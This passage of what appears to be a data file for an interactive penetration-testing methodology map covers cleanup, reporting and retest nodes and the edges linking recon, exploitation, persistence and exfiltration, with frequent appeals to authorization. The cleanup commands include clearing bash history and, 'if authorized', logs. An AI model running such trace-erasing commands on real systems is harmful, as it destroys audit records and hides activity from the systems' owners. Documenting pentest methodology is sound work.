                            descriptionMd: '### Cleanup\n**Critical final step:** Remove all artifacts created during testing.\n\n**Checklist:**\n- Remove test accounts\n- Delete uploaded files/tools\n- Remove shells and backdoors\n- Delete scheduled tasks/cron jobs\n- Revert configuration changes\n- Remove registry keys\n- Clear logs (if authorized)\n- Document cleanup actions',
                            commands: [{
                                    description: 'Cleanup log',
                                    code: 'echo "$(date -Is) cleanup: removed /tmp/shell.elf" >> cleanup.log'
                                },
                                {
                                    description: 'Remove files',
                                    code: 'rm -f /tmp/{shell,linpeas,tools}*'
                                },
                                {
                                    description: 'Remove user (Linux)',
                                    code: 'userdel -r testuser'
                                },
                                {
                                    description: 'Remove scheduled task (Win)',
                                    code: 'schtasks /delete /tn "TaskName" /f'
                                },
                                {
                                    description: 'Remove registry key',
                                    code: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /f'
                                },
                                {
                                    description: 'Clear bash history',
                                    code: 'history -c && cat /dev/null > ~/.bash_history'
                                },
                                {
                                    description: 'Restore file permissions',
                                    code: 'chmod 644 /path/to/file'
                                }
                            ],
                            type: 'technique',
                            emoji: '🧹',
                            resources: []
                        },
                        children: []
                    }
                ]
            },

            {
                id: 'reporting',
                data: {
                    label: 'Reporting',
                    description: 'Write, Communicate, Remediate',
                    descriptionMd: '### Reporting\nDeliver actionable findings with reproducible steps and clear remediation.\n\n- Executive summary\n- Methodology & scope\n- Findings (risk, impact, evidence)\n- Remediation guidance\n- Appendix (assets, tooling, timelines)\n',
                    commands: [],
                    type: 'category',
                    emoji: '📝',
                    resources: [{
                            title: 'OWASP Risk Rating Methodology',
                            url: 'https://owasp.org/www-project-risk-rating-methodology/'
                        },
                        {
                            title: 'MITRE CWE Top 25',
                            url: 'https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html'
                        }
                    ]
                },
                children: [{
                        id: 'triage-severity',
                        data: {
                            label: 'Severity & Triage',
                            description: 'Risk scoring',
                            descriptionMd: '### Severity & Triage\nScore based on likelihood × impact, adjusted by compensating controls and exploitability.',
                            commands: [{
                                description: 'CVSS note',
                                code: 'Use CVSS where applicable; add business context & environment modifiers.'
                            }],
                            type: 'technique',
                            emoji: '📊',
                            resources: []
                        },
                        children: []
                    },
                    {
                        id: 'writeups',
                        data: {
                            label: 'Writeups',
                            description: 'Repro + fix',
                            descriptionMd: '### Writeup Structure\nInclude: summary, affected assets, steps to reproduce, expected vs actual, impact, screenshots/requests, and remediation.',
                            commands: [{
                                description: 'Finding template (stub)',
                                code: 'cat > report/finding-template.md << "EOF"\n# Finding: \n## Summary\n\n## Affected Assets\n\n## Steps to Reproduce\n\n## Impact\n\n## Evidence\n\n## Remediation\n\n## References\nEOF'
                            }],
                            type: 'technique',
                            emoji: '🧷',
                            resources: []
                        },
                        children: []
                    }
                ]
            },

            {
                id: 'retest',
                data: {
                    label: 'Retest / Validation',
                    description: 'Verify fixes',
                    descriptionMd: '### Retest\nReproduce only what is needed to confirm remediation and verify no regressions.',
                    commands: [{
                        description: 'Retest notes',
                        code: 'echo "$(date -Is) retest: finding-id -> PASS/FAIL" >> notes/retest.log'
                    }],
                    type: 'category',
                    emoji: '✅',
                    resources: []
                },
                children: []
            }
        ]
    },

    extraEdges: [{
            "id": "e-scope-recon",
            "source": "scope",
            "target": "recon",
            "data": {
                "label": "Authorization",
                "type": "flow",
                "descriptionMd": "Scope and ROE **govern** what recon is allowed, how noisy it can be, and what data may be collected."
            }
        },
        {
            "id": "e-opsec-recon",
            "source": "opsec",
            "target": "recon",
            "data": {
                "label": "Safety Controls",
                "type": "flow",
                "descriptionMd": "OpSec guidance (throttling, read-only first, non-destructive payloads) shapes recon tactics and tooling."
            }
        },
        {
            "id": "e-opsec-port-scan",
            "source": "opsec",
            "target": "port-scan",
            "data": {
                "label": "Rate Limits",
                "type": "flow",
                "descriptionMd": "Scanner timing/concurrency decisions should follow agreed safety constraints to avoid outages and bans."
            }
        },
        {
            "id": "e-passive-subdomains",
            "source": "passive",
            "target": "subdomains",
            "data": {
                "label": "Surface Expansion",
                "type": "flow",
                "descriptionMd": "Passive recon feeds subdomain discovery via OSINT sources, CT logs, and historical DNS."
            }
        },
        {
            "id": "e-certtrans-subdomains",
            "source": "cert-transparency",
            "target": "subdomains",
            "data": {
                "label": "Hostname Seeds",
                "type": "context",
                "descriptionMd": "Certificate Transparency often reveals hostnames that become subdomain enumeration seeds."
            }
        },
        {
            "id": "e-wayback-web-enum",
            "source": "wayback",
            "target": "web-enum",
            "data": {
                "label": "Hidden Paths",
                "type": "context",
                "descriptionMd": "Archived URLs and old site versions often expose forgotten endpoints, backups, and prior admin paths for web enumeration."
            }
        },
        {
            "id": "e-metadata-osint",
            "source": "metadata",
            "target": "osint",
            "data": {
                "label": "Identity Intel",
                "type": "context",
                "descriptionMd": "Document metadata (authors, usernames, internal paths) enriches OSINT and can seed username lists and internal naming conventions."
            }
        },
        {
            "id": "e-social-osint",
            "source": "social-media",
            "target": "osint",
            "data": {
                "label": "Org Context",
                "type": "context",
                "descriptionMd": "Social intel reinforces employee lists, tech stack hints, and business context used throughout recon and triage."
            }
        },
        {
            "id": "e-osint-subdomains",
            "source": "osint",
            "target": "subdomains",
            "data": {
                "label": "Seeds & Patterns",
                "type": "context",
                "descriptionMd": "OSINT discoveries (acquisitions, brands, naming patterns) frequently expand subdomain search space."
            }
        },
        {
            "id": "e-subdomains-http-probing",
            "source": "subdomains",
            "target": "http-probing",
            "data": {
                "label": "Alive Filtering",
                "type": "flow",
                "descriptionMd": "Subdomain results should be normalized and probed to identify which hosts actually expose web services."
            }
        },
        {
            "id": "e-dnsenum-subdomains",
            "source": "dns-enum",
            "target": "subdomains",
            "data": {
                "label": "Discovery Loop",
                "type": "flow",
                "descriptionMd": "DNS enumeration (SRV/TXT/CNAME patterns, zone leaks) can reveal additional names that re-enter the subdomain pipeline."
            }
        },
        {
            "id": "e-dnsenum-portscan",
            "source": "dns-enum",
            "target": "port-scan",
            "data": {
                "label": "Targets",
                "type": "flow",
                "descriptionMd": "Resolved records and discovered IPs become direct inputs for port scanning scope."
            }
        },
        {
            "id": "e-portscan-service-enum",
            "source": "port-scan",
            "target": "service-enum",
            "data": {
                "label": "Bannering",
                "type": "flow",
                "descriptionMd": "Open ports drive service enumeration to identify exact protocols, versions, and exposed features."
            }
        },
        {
            "id": "e-http-probing-web-enum",
            "source": "http-probing",
            "target": "web-enum",
            "data": {
                "label": "Web Targets",
                "type": "flow",
                "descriptionMd": "HTTP probing results (titles, tech fingerprints, redirects) prioritize and focus web enumeration."
            }
        },
        {
            "id": "e-web-enum-api-discovery",
            "source": "web-enum",
            "target": "api-discovery",
            "data": {
                "label": "API Entry Points",
                "type": "flow",
                "descriptionMd": "Web enumeration often uncovers swagger files, GraphQL routes, and undocumented endpoints that feed API discovery."
            }
        },
        {
            "id": "e-wayback-api-discovery",
            "source": "wayback",
            "target": "api-discovery",
            "data": {
                "label": "Deprecated Routes",
                "type": "context",
                "descriptionMd": "Historical URLs frequently reveal older API versions and endpoints still reachable today."
            }
        },
        {
            "id": "e-recon-attacksurface",
            "source": "http-probing",
            "target": "attack-surface-map",
            "data": {
                "label": "Inputs Inventory",
                "type": "flow",
                "descriptionMd": "Discovered hosts and endpoints become the basis for mapping inputs, trust boundaries, and auth flows."
            }
        },
        {
            "id": "e-serviceenum-vulnanalysis",
            "source": "service-enum",
            "target": "vuln-analysis",
            "data": {
                "label": "Version Correlation",
                "type": "flow",
                "descriptionMd": "Service names and versions are the primary artifacts used to correlate to CVEs and prioritize manual verification."
            }
        },
        {
            "id": "e-portscan-vulnanalysis",
            "source": "port-scan",
            "target": "vuln-analysis",
            "data": {
                "label": "Triage Inputs",
                "type": "flow",
                "descriptionMd": "Port exposure and service presence define the reachable attack surface for vulnerability analysis and prioritization."
            }
        },
        {
            "id": "e-cloudenum-misconfig",
            "source": "cloud-enum",
            "target": "misconfig",
            "data": {
                "label": "Cloud Findings",
                "type": "flow",
                "descriptionMd": "Bucket/blob/storage discovery is typically evaluated as a misconfiguration risk (permissions, exposure, takeover)."
            }
        },
        {
            "id": "e-codeosint-misconfig",
            "source": "code-osint",
            "target": "misconfig",
            "data": {
                "label": "Leaked Secrets",
                "type": "context",
                "descriptionMd": "Repo leaks (tokens, endpoints, configs) often indicate weak secret management and misconfiguration/hardening gaps."
            }
        },
        {
            "id": "e-leakedcreds-brute",
            "source": "leaked-creds",
            "target": "brute",
            "data": {
                "label": "Credential Inputs",
                "type": "assist",
                "descriptionMd": "Verified breach exposure can seed controlled credential testing strategies (e.g., password spraying) when permitted."
            }
        },
        {
            "id": "e-webvulnscan-vulnanalysis",
            "source": "web-vuln-scan",
            "target": "vuln-analysis",
            "data": {
                "label": "Scanner Triage",
                "type": "flow",
                "descriptionMd": "Automated scan outputs must be validated and deduplicated as part of vulnerability analysis."
            }
        },
        {
            "id": "e-cmsscan-webenum",
            "source": "cms-scan",
            "target": "web-enum",
            "data": {
                "label": "Deep CMS Enum",
                "type": "flow",
                "descriptionMd": "CMS identification triggers specialized enumeration of plugins/themes/users that augments web enumeration coverage."
            }
        },
        {
            "id": "e-webenum-injection",
            "source": "web-enum",
            "target": "injection",
            "data": {
                "label": "Attack Surface",
                "type": "flow",
                "descriptionMd": "Enumeration highlights **inputs** and behaviors that are candidates for injection testing."
            }
        },
        {
            "id": "e-apidiscovery-idor",
            "source": "api-discovery",
            "target": "idor",
            "data": {
                "label": "Object Access",
                "type": "flow",
                "descriptionMd": "Discovered API routes and identifiers drive systematic authorization testing for BOLA/IDOR patterns."
            }
        },
        {
            "id": "e-apidiscovery-apiabuse",
            "source": "api-discovery",
            "target": "api-abuse",
            "data": {
                "label": "API Exploit Paths",
                "type": "flow",
                "descriptionMd": "API discovery outputs (routes, schemas, versions) directly enable targeted API abuse testing."
            }
        },
        {
            "id": "e-misconfig-ssrf",
            "source": "misconfig",
            "target": "ssrf",
            "data": {
                "label": "Common Enabler",
                "type": "context",
                "descriptionMd": "Misconfigurations (egress rules, metadata exposure, weak validation) frequently enable or amplify SSRF impact."
            }
        },
        {
            "id": "e-vuln-exploit",
            "source": "vuln-analysis",
            "target": "exploitation",
            "data": {
                "label": "Exploit Plan",
                "type": "flow",
                "descriptionMd": "Validated findings guide **safe** exploitation paths aligned with scope and safety constraints."
            }
        },
        {
            "id": "e-scope-exploitation",
            "source": "scope",
            "target": "exploitation",
            "data": {
                "label": "ROE Gates",
                "type": "flow",
                "descriptionMd": "Exploitation techniques and payload constraints must remain within explicitly authorized ROE boundaries."
            }
        },
        {
            "id": "e-exploit-postexp",
            "source": "exploitation",
            "target": "post-exp",
            "data": {
                "label": "Initial Access",
                "type": "flow",
                "descriptionMd": "Successful exploitation transitions into post-exploitation for privilege escalation, internal recon, and impact proof."
            }
        },
        {
            "id": "e-injection-post-exp",
            "source": "injection",
            "target": "post-exp",
            "data": {
                "label": "Shell Access",
                "type": "flow",
                "descriptionMd": "Successful injection can yield code execution and become an entry point into **post-exploitation**."
            }
        },
        {
            "id": "e-linuxpe-pivoting",
            "source": "linux-pe",
            "target": "pivoting",
            "data": {
                "label": "Network Reach",
                "type": "flow",
                "descriptionMd": "Privilege escalation often unlocks routing, tooling installation, and credentials needed for pivoting to internal networks."
            }
        },
        {
            "id": "e-winpe-lateralmove",
            "source": "win-pe",
            "target": "lateral-movement",
            "data": {
                "label": "Domain Movement",
                "type": "flow",
                "descriptionMd": "Elevated Windows context enables broader lateral movement options (remote exec, credential access, admin shares)."
            }
        },
        {
            "id": "e-pivoting-lateralmove",
            "source": "pivoting",
            "target": "lateral-movement",
            "data": {
                "label": "Reachability",
                "type": "flow",
                "descriptionMd": "Pivoting creates network reachability that enables lateral movement against internal hosts and services."
            }
        },
        {
            "id": "e-lateralmove-persistence",
            "source": "lateral-movement",
            "target": "persistence",
            "data": {
                "label": "Continuity",
                "type": "flow",
                "descriptionMd": "After moving laterally, persistence may be required (when authorized) to maintain access for validation and retest."
            }
        },
        {
            "id": "e-postexp-dataexfil",
            "source": "post-exp",
            "target": "data-exfil",
            "data": {
                "label": "Objectives",
                "type": "flow",
                "descriptionMd": "If explicitly authorized, post-exploitation may include controlled data extraction to demonstrate impact."
            }
        },
        {
            "id": "e-dataexfil-impactproof",
            "source": "data-exfil",
            "target": "impact-proof",
            "data": {
                "label": "Evidence",
                "type": "flow",
                "descriptionMd": "Any authorized data access should be translated into minimal, defensible proof-of-impact artifacts."
            }
        },
        {
            "id": "e-postexp-impactproof",
            "source": "post-exp",
            "target": "impact-proof",
            "data": {
                "label": "Proof Collection",
                "type": "flow",
                "descriptionMd": "Post-exploitation activities should culminate in minimal evidence that demonstrates control and business impact."
            }
        },
        {
            "id": "e-impactproof-reporting",
            "source": "impact-proof",
            "target": "reporting",
            "data": {
                "label": "Writeup Inputs",
                "type": "flow",
                "descriptionMd": "Collected proof artifacts and timelines feed directly into finding writeups and executive summaries."
            }
        },
        {
            "id": "e-post-report",
            "source": "post-exp",
            "target": "reporting",
            "data": {
                "label": "Evidence",
                "type": "flow",
                "descriptionMd": "Post-exploitation outputs (access level, paths, and evidence) drive reporting and remediation guidance."
            }
        },
        {
            "id": "e-scope-reporting",
            "source": "scope",
            "target": "reporting",
            "data": {
                "label": "Methodology & Limits",
                "type": "flow",
                "descriptionMd": "Scope, exclusions, and constraints should be reflected clearly in the final report methodology section."
            }
        },
        {
            "id": "e-report-retest",
            "source": "reporting",
            "target": "retest",
            "data": {
                "label": "Fix Verification",
                "type": "flow",
                "descriptionMd": "Reported findings drive remediation; retest validates **closure** and checks for regressions."
            }
        },
        {
            "id": "e-postexp-cleanup",
            "source": "post-exp",
            "target": "cleanup",
            "data": {
                "label": "Artifact Removal",
                "type": "flow",
                "descriptionMd": "Tools, accounts, tunnels, and changes introduced during post-exploitation should be removed and documented."
            }
        },
        {
            "id": "e-cleanup-reporting",
            "source": "cleanup",
            "target": "reporting",
            "data": {
                "label": "Audit Trail",
                "type": "flow",
                "descriptionMd": "Cleanup actions and any residual risk notes should be recorded and referenced in the report appendix/timeline."
            }
        },
        {
            "id": "e-brute-netexploit",
            "source": "brute",
            "target": "net-exploit",
            "data": {
                "label": "Access Attempts",
                "type": "assist",
                "descriptionMd": "If credentials are obtained (and permitted), they can unlock authenticated paths for network exploitation modules and techniques."
            }
        }
    ]
};